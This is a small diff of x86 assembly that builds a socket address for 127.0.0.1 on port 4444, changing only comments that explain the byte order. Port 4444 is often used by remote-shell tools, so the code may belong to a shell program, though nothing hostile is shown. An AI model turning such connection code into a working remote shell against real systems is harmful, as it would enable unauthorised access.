@@ -198,13 +198,13 @@ Mov Dl, 2H
 Mov sockAdd.sin_family, Dx
 Mov Dx, 5C11H ; port = 4444 = 115ch in little indian
 Mov sockAdd.sin_port, Dx
-Mov Dl, 1H ; 4th byte in ip address in hexa
-Shl Edx, 8
-Mov Dl, Bl ; 3th byte in ip address in hexa bl=0
+Mov Dl, 1H ; 4th byte in ip address in hexa ; <-------------   
+Shl Edx, 8;                                                |
+Mov Dl, Bl ; 3th byte in ip address in hexa bl=0;          v
 Shl Edx, 8                                             ; ip = 127.0.0.1                            
-Mov Dl, Bl; 2nd byte in ip address in hexa
-Shl Edx, 8
-Mov Dl, 7fH; 1st byte in ip address
+Mov Dl, Bl; 2nd byte in ip address in hexa            ;    ^
+Shl Edx, 8                               ;                 |            
+Mov Dl, 7fH; 1st byte in ip address         <--------------|
 Mov sockAdd.sin_addr, Edx
 Lea Edx, sockAdd
 Push SizeOf sockAdd
